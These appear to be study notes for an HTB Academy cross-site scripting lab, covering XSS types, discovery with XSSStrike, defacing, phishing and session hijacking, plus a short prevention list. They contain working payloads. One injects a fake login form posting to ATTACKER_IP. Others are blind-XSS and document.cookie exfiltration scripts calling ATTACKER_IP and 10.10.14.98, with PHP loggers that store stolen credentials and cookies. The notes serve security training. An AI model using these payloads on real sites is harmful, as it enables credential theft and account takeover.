# Cross-Site Scripting (XSS)

1. [XSS Basics](#xss-basics)
1. [XSS Attacks](#xss-attacks)
1. [Skills Assessment](#skills-assessment)

## XSS Basics

* XSS attacks refer to injecting malicious JavaScript code; limited to browser's JS engine.

* Stored XSS (Persistent):

  * if injected XSS payload gets stored in back-end DB and retrieved on page load, the XSS attack is persistent
  
  * check whether input is being sanitized or filtered with a basic XSS payload:

    ```html
    <script>alert(window.origin)</script>
    ```
  
  * if the page is vulnerable to XSS, on input/reload, we get a pop-up with page URL; the payload can be viewed in page source as well

  * if ```alert()``` function is blocked, we can use other elements in payload like ```<plaintext>``` or ```<script>print()</script>```

* Reflected XSS (Non-persistent):

  * input gets processed by back-end server and returns without proper filtering/sanitizing; temporary and affects only target user

  * to test, we can use the same basic payload:

    ```html
    <script>alert(window.origin)</script>
    ```
  
  * to target a user, we can send them a URL containing our payload - we can copy URL from URL bar or from Developer Tools > Network > Request containing payload > Copy URL

* DOM XSS (Non-persistent):

  * payload completely processed on client-side through DOM (Document Object Model)

  * source - JS object that takes user input

  * sink - function that writes user input to a DOM object

  * if sink function writes input without sanitization, it can be vulnerable to XSS; we can check source code for this

  * we cannot use previously used payloads in this case, as ```innerHTML``` function does not allow ```<script>``` tags

  * in this case, we can use XSS payloads which don't contain ```<script>```:

    ```html
    <img src="" onerror=alert(window.origin)>
    ```

* XSS Discovery:

  * While web app vulnerability scanners like Nessus, Burp Suite Pro or ZAP have capabilities for detecting XSS vulnerabilities, we can use tools like [XSS Strike](https://github.com/s0md3v/XSStrike), [Brute XSS](https://github.com/rajeshmajumdar/BruteXSS), and [XSSer](https://github.com/epsylon/xsser) as well.

    ```shell
    # setup XSS Strike
    git clone https://github.com/s0md3v/XSStrike.git
    cd XSStrike
    pip install -r requirements.txt
    python xsstrike.py

    python xsstrike.py -u "http://83.136.251.235:35702/?fullname=sv&username=sv&password=password&email=email%40email.com"
    # the tool will check for all params
    ```

  * For manual discovery, a combination of manual code review and trying subset of XSS payloads (based on point of injection) can be used.

## XSS Attacks

* Defacing:

  * We can modify HTML elements like background (```document.body.style.background```, ```document.body.background```), page title (```document.title```), and page text (```DOM.innerhtml```); works best with stored XSS as it is persistent.

  * Change background - ```<script>document.body.style.background = "#141d2b"</script>```

  * Change background image - ```<script>document.body.background = "https://www.hackthebox.eu/images/logo-htb.svg"</script>```

  * Change page title - ```<script>document.title = 'HackTheBox Academy'</script>```

  * Multiple ways to change text -

    * Using ```innerhtml``` - ```document.getElementById("todo").innerHTML = "New Text"```

    * Using ```jQuery``` functions - ```$("#todo").html('New Text');```

    * Change main body - ```document.getElementsByTagName('body')[0].innerHTML = "New Text"```
  
  * We can combine all of these into HTML code, which can be later minified (into single line) and add to XSS payload:

    ```html
    <center>
        <h1 style="color: white">Cyber Security Training</h1>
        <p style="color: white">by 
            <img src="https://academy.hackthebox.com/images/logo-htb.svg" height="25px" alt="HTB Academy">
        </p>
    </center>
    ```

    ```html
    <script>document.getElementsByTagName('body')[0].innerHTML = '<center><h1 style=...alt="HTB Academy"> </p></center>'</script>
    ```

* Phishing:

  * Firstly, we need to identify a working XSS payload that successfully executes JS code on the page

  * For the given case, once we use a basic payload, we can check how it is reflected in page source; accordingly we can use a payload like ```'><script>alert(window.origin)</script>```

  * Next, we need to inject HTML code that displays a login form on the targeted page - this form should send login creds to our server

  * The JS code that needs to be used into our XSS payload should contain the minified HTML form code:

    ```js
    document.write('<h3>Please login to continue</h3><form action=http://ATTACKER_IP><input type="username" name="username" placeholder="Username"><input type="password" name="password" placeholder="Password"><input type="submit" name="submit" value="Login"></form>');
    ```
  
  * Additionally, we can remove other elements from the webpage which could indicate that it is a phishing attempt:

    ```js
    document.getElementById('urlform').remove();
    ```
  
  * Our final payload (includes HTML comment syntax at end to remove remnants of payload):

    ```html
    '><script>document.write('<h3>Please login to continue</h3><form action=http://ATTACKER_IP><input type="username" name="username" placeholder="Username"><input type="password" name="password" placeholder="Password"><input type="submit" name="submit" value="Login"></form>');document.getElementById('urlform').remove();</script> <!--
    ```
  
  * We can listen on attacker server using ```sudo nc -lvnp 80``` - we can capture login attempts

  * To handle the HTTP request correctly however, we can use a PHP script that logs creds and returns victim to original page:

    ```php
    <?php
    if (isset($_GET['username']) && isset($_GET['password'])) {
        $file = fopen("creds.txt", "a+");
        fputs($file, "Username: {$_GET['username']} | Password: {$_GET['password']}\n");
        header("Location: http://SERVER_IP/phishing/index.php");
        fclose($file);
        exit();
    }
    ?>
    ```

    ```shell
    # we can create a temporary server
    mkdir /tmp/tmpserver

    cd /tmp/tmpserver

    vim index.php
    # add php script

    sudo php -S 0.0.0.0:80

    # now we can use the XSS payload and get a malicious URL
    # once there is a successful login attempt with the URL
    # we can get the creds in creds.txt file
    ```

* Session hijacking:

  * Blind XSS vulnerability - when vulnerability is triggered on a page we cannot access

  * We can use a JS payload that sends an HTTP request back to our server - if JS code gets executed, we get response on our machine which indicates vulnerability

  * In the example of a form, as there can be multiple fields, we can change the requested script name to the field name - ```<script src="http://ATTACKER_IP/username"></script>```

  * We can refer payloads for blind XSS from [PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/XSS%20Injection#blind-xss). Before sending payloads, start a listener:

    ```shell
    mkdir /tmp/tmpserver

    cd /tmp/tmpserver

    sudo php -S 0.0.0.0:80
    ```
  
  * We can decide which fields to test for - fields like email (format) and password (hashed, not in cleartext) can be skipped.

  * We can test the following payloads:

    ```html
    <script src=http://ATTACKER_IP/fullname></script> <!--this one is for the full name field-->
    <script src=http://ATTACKER_IP/username></script> <!--this one is for username field-->
    <script src=http://ATTACKER_IP/url></script>  <!--this one is for profile picture URL-->
    ```
  
  * After experimenting with the payloads for blind XSS, this payload works (because we can see a response in our server)

    ```html
    "><script src=http://ATTACKER_IP/url></script>
    ```
  
  * After finding the vulnerable input field with working XSS payload, we can [refer JS payloads to grab session cookies](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/XSS%20Injection#exploit-code-or-poc)

  * For example, if we want to use the payload ```new Image().src='http://ATTACKER_IP/index.php?c='+document.cookie;```, we need to write it to a ```script.js``` file; and our updated payload should be ```"><script src=http://ATTACKER_IP/script.js></script>```

  * For multiple cookies, it's better to use a PHP script and save it to ```index.php``` (re-run the PHP server):

    ```php
    <?php
    if (isset($_GET['c'])) {
        $list = explode(";", $_GET['c']);
        foreach ($list as $key => $value) {
            $cookie = urldecode($value);
            $file = fopen("cookies.txt", "a+");
            fputs($file, "Victim IP: {$_SERVER['REMOTE_ADDR']} | Cookie: {$cookie}\n");
            fclose($file);
        }
    }
    ?>
    ```
  
  * Once the victim visits the vulnerable page and views the XSS payload, we would be able to see the requests and the cookies would be stored to a file

  * This cookie can be used on the ```login.php``` page to access the victim's account by using Developer Tools > Storage

* XSS Prevention:

  * Front-end:

    * Input validation
    * Input sanitization
    * Avoid using direct user input
  
  * Back-end:

    * Input validation
    * Input sanitization
    * Output HTML encoding
    * Server configuration

## Skills Assessment

* We can go for blind XSS detection as the blog page contains 4 fields - comment, name, email and website - and it is mentioned the comment may need to be approved by an admin.

  ```shell
  mkdir /tmp/tmpserver

  cd /tmp/tmpserver

  vim index.php
  # create the PHP script given for blind XSS to store cookies

  sudo php -S 0.0.0.0:80
  ```

* We can test the following payloads for the respective fields for blind XSS (we can skip name and email field as it is checked here):

  ```html
  <script src=http://10.10.14.98/comment></script>
  <script src=http://10.10.14.98/website></script>

  '><script src=http://10.10.14.98/comment></script>
  '><script src=http://10.10.14.98/website></script>

  "><script src=http://10.10.14.98/comment></script>
  "><script src=http://10.10.14.98/website></script>

  javascript:eval('var a=document.createElement(\'script\');a.src=\'http://10.10.14.98/comment\';document.body.appendChild(a)')
  javascript:eval('var a=document.createElement(\'script\');a.src=\'http://10.10.14.98/website\';document.body.appendChild(a)')

  <script>function b(){eval(this.responseText)};a=new XMLHttpRequest();a.addEventListener("load", b);a.open("GET", "//10.10.14.98/comment");a.send();</script>
  <script>function b(){eval(this.responseText)};a=new XMLHttpRequest();a.addEventListener("load", b);a.open("GET", "//10.10.14.98/website");a.send();</script>

  <script>$.getScript("http://10.10.14.98/comment")</script>
  <script>$.getScript("http://10.10.14.98/website")</script>
  ```

* The payload ```"><script src=http://10.10.14.98/website></script>``` works and we get a response back in our PHP server.

* So, we can create a ```script.js``` file with the payload ```new Image().src='http://10.10.14.98/index.php?c='+document.cookie;``` and restart the PHP server.

* Now, if we use the payload ```"><script src=http://10.10.14.98/script.js></script>``` for the 'website' field, we get a response back with the cookie value fetched.
